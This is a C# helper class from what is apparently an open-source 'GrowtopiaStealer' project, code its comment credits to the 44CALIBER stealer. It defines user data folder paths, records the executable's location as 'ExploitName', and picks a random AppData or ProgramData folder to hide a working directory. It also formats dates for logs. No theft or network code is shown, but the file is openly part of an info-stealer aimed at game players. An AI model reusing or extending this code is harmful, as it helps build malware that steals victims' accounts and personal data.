using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer that code from https://github.com/Khainaaeh/44CALIBER/blob/main/44CALIBER/Helpers/Help.cs
{
    class Help
    {
        // Paths
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // Рабочий стол
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); // AppData\Local
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // System32
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // %appdata%
        public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData); // C:\ProgramData
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // Документы
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); // C:\Users\admin
        public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;
        public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);

        public static string[] SysPatch = new string[]
        {
        AppData,
        LocalData,
        CommonData
        };

        public static string zxczxczxc = SysPatch[new Random().Next(0, SysPatch.Length)];

        public static string ExploitDir = zxczxczxc + "\\" + "the";

        // Getting current date
        public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");
        public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
    }
}
